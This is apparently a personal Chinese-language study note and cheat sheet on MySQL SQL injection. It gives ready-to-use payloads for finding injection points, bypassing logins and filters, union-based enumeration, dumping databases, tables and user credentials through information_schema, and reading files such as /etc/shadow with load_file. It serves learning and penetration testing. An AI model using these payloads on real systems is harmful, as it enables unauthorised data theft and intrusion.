---
title: SQL 注入
date: 2026-08-04
tags: [Web安全, SQL注入, MySQL, information_schema, 注入技巧]
summary: SQL 注入基础与高级技巧：判断注入点、注释/空格绕过、union 联合查询、爆库表字段、information_schema、读写文件。
---

> 个人 Web 安全笔记整理（MySQL 为主）。

## 1. SQL 基础语句

```sql
select <列名> from <表名> [where <条件>]
insert [into] <表名> [列名] values <值列表>
update <表名> set <列名=更新值> [where <条件>]
delete from <表名> [where <条件>]

-- 高级查询
order by <列> asc/desc          -- 排序
select ... as 别名               -- 重命名
limit <n> / limit <m>,<n>       -- 取行数（索引从0）
like "王_" / "%王%"              -- 模糊（_一个字符 %零到多）
between <a> and <b>             -- 闭区间
in (<值列表>)                    -- 范围
count/sum/avg/max/min           -- 聚合函数
group by ... having ...         -- 分组
inner join / left join ... on ...  -- 多表联结
```

## 2. 注入基础

### 注释符与空格绕过

```sql
# Hash comment
/* C-style comment */
-- -  SQL comment（--后必须跟空格）
;%00  Nullbyte
`  Backtick

-- 空格被过滤时：
/**/ 或 () 或 + 代替空格
%0c %09 %0d %0a %0b（各种空白字符）
```

### 判断注入点

```text
字符串型：' 报错 / '' 正常；" 报错 / "" 正常；\ 报错 / \\ 正常
数字型：AND 1 / AND 0、1-false、1-true、1*56（返回 56 则注入）
登录绕过：' OR '1、' OR 1 -- -、'=0--+
```

## 3. 爆字段（union）

```sql
order by 数字      -- 根据返回正确/错误猜字段数
group by 数字
and 1=1 union select 1,2,3,4,5    -- 匹配字段
and 1=2 union select 1,2,3,4,5    -- 让前面查询不返回，露出 union 结果
-- 也可 id=负数 / id=空值

-- union 要求列数一致；union all 不去重（推荐，防某些情况）
-- 列类型不确定用 null：UNION ALL SELECT NULL,NULL,NULL...
```

## 4. 爆信息（内置函数）

```sql
version() / @@version / @@GLOBAL.VERSION      版本
user()                                       当前用户
database()                                   当前数据库
load_file('c:\\boot.ini')                    读文件（用 \\ 或 hex）
@@datadir / @@basedir / @@general_log_file   路径/端口
@@port / @@global.version_compile_os        端口/系统
UUID()                                       后48位为MAC
```

### 合并查询结果

```sql
concat(user(),'|',@@version,'|',database())    -- 合并多列，| 用 0x7c
concat_ws()                                  -- 同功能
```

### 权限查看

```sql
and 1=2 union all select 1,null,group_concat(distinct grantee,0x7c,privilege_type,0x7c,is_grantable)
FROM information_schema.user_privileges -- -
and (select count(*) from MySQL.user)>0    -- 返回正确说明权限高
```

## 5. 爆库表字段（information_schema）

```sql
-- 读所有数据库名
select group_concat(schema_name) FROM information_schema.schemata
-- 读当前库表名
group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
-- 读指定表列名（库/表用 hex 避免引号过滤）
Select group_concat(column_name) FROM information_schema.columns
  WHERE table_schema=0x库十六进制 and table_name=0x表十六进制
-- 查询指定值
Select group_concat(列名1,0x7c,列名2) FROM 数据库名.表名
-- 编码不一致用 hex
select unhex(hex(group_concat(id,0x7c,username,0x7c,password))) from security.users
```

```text
三层结构：
information_schema.schemata   库名 → schema_name
information_schema.tables     表名 → table_schema
information_schema.columns    字段 → table_schema / table_name / column_name
```

## 6. 补充技巧

```text
数据库敏感文件：/etc/passwd、/etc/shadow（Linux）；SAM/SYSTEM（Windows）
文件包含配合：php://filter、data://、zip://、phar://
注释：--+ 与 -- （SQL 注释）
%00 截断（旧 PHP）
```

---

> **一句话总结**：SQLi 套路 = 判断注入点（真假查询）→ order by 爆字段 → union select 定位 → information_schema 爆库/表/列 → 取数据。绕过：注释符、空格替换、hex 编码。
